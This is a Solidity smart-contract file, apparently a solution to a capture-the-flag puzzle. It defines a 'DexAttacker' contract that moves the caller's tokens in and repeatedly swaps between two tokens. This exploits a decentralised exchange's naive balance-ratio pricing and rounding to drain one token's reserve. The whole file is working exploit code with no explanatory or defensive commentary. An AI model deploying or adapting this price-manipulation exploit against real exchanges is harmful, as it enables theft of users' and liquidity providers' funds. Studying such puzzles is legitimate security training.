// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function approve(address spender, uint256 amount) external;

    function token1() external view returns (address);

    function token2() external view returns (address);

    function balanceOf(address token, address account) external view returns (uint256);

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

contract DexAttacker {
    IDex public instance;

    constructor(address _instance) public {
        instance = IDex(_instance);
    }

    function attack() public {
        address token1 = instance.token1();
        address token2 = instance.token2();

        IERC20(token1).transferFrom(tx.origin, address(this), 10);
        IERC20(token2).transferFrom(tx.origin, address(this), 10);

        instance.approve(address(instance), type(uint256).max);

        while (IERC20(token1).balanceOf(address(this)) < 110) {
            instance.swap(token1, token2, IERC20(token1).balanceOf(address(this)));

            if (instance.getSwapPrice(token2, token1, IERC20(token2).balanceOf(address(this))) < 110) {
                instance.swap(token2, token1, IERC20(token2).balanceOf(address(this)));
            } else {
                uint256 amount = (110 * IERC20(token2).balanceOf(address(instance))) /
                    IERC20(token1).balanceOf(address(instance));
                instance.swap(token2, token1, amount);
            }
        }
    }
}
